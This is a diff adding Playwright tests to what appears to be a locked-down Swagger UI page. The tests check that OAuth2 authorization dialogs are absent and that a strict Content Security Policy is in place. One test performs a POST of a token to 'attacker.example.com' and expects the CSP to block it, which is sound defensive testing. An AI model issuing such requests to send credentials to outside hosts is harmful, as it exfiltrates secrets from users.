@@ -90,6 +90,56 @@ test.describe('untrusted content', () => {
   });
 });
 
+test.describe('security schemes', () => {
+  for (const [spec, title] of [
+    ['oauth2-password', 'OAuth2 password flow'],
+    ['oauth2-implicit', 'OAuth2 implicit flow'],
+    ['oauth2-swagger2', 'Swagger 2.0 security definitions'],
+  ]) {
+    test(`${spec}: no Authorize dialog, no lock buttons, no popup`, async ({ page }) => {
+      const popups: string[] = [];
+      page.on('popup', (popup) => popups.push(popup.url()));
+      await open(page, { spec });
+      await expect(page.locator('.info .title')).toContainText(title);
+      await operations(page).first().locator('.opblock-summary').click();
+      await expect(page.locator('.opblock-body').first()).toBeVisible();
+      await expect(page.locator('.btn.authorize')).toHaveCount(0);
+      await expect(page.locator('.authorization__btn')).toHaveCount(0);
+      await expect(page.locator('.dialog-ux, .auth-container')).toHaveCount(0);
+      expect(popups).toEqual([]);
+    });
+  }
+
+  test('the built page has the strict Content Security Policy', async ({ page }) => {
+    await open(page, { spec: 'petstore-json' });
+    const csp = await page
+      .locator('meta[http-equiv="Content-Security-Policy"]')
+      .getAttribute('content');
+    for (const directive of [
+      "default-src 'self'",
+      "script-src 'self'",
+      "connect-src 'self'",
+      "frame-src 'none'",
+      "form-action 'none'",
+      "object-src 'none'",
+    ]) {
+      expect(csp).toContain(directive);
+    }
+  });
+
+  test('a request to a foreign host is blocked by the CSP', async ({ page }) => {
+    await open(page, { spec: 'petstore-json' });
+    await expect(page.locator('.info .title')).toContainText('Petstore');
+    const result = await page.evaluate(() =>
+      fetch('https://attacker.example.com/token', { method: 'POST', body: 'x' }).then(
+        () => 'sent',
+        () => 'blocked',
+      ),
+    );
+    expect(result).toBe('blocked');
+  });
+});
+
 test.describe('error states', () => {
   for (const [fail, message] of [
     ['forbidden', /do not have permission/],
